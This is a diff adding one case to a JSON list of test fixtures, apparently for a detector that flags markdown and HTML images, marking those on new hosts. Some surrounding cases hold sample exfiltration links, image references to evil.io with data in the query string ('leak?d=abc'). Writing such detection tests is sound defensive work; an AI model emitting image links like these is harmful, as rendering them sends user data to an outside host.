@@ -28,6 +28,7 @@
   {"name": "an image by reference", "parts": ["![build][badge]"], "flags": ["image"]},
   {"name": "an image by its label alone", "parts": ["![logo]\n\n[logo]: https://github.com/acme/logo.png"], "flags": ["image"]},
   {"name": "an image by its label alone, defined without a scheme", "parts": ["![a]\n\n[a]: //evil.io/leak?d=abc"], "flags": ["new_host", "image"]},
+  {"name": "an image by its label alone, defined in another paragraph", "parts": ["![logo]", "[Logo]: https://github.com/acme/logo.png"], "flags": ["image"]},
   {"name": "an image in HTML", "parts": ["<IMG src=\"https://github.com/acme/a.png\">"], "flags": ["image"]},
   {"name": "an image as data", "parts": ["![x](data:image/gif;base64,R0lGOD)"], "flags": ["image"]},
   {"name": "an image on a new host", "parts": ["![x](https://evil.io/p.png?d=1)"], "flags": ["new_host", "image"]},
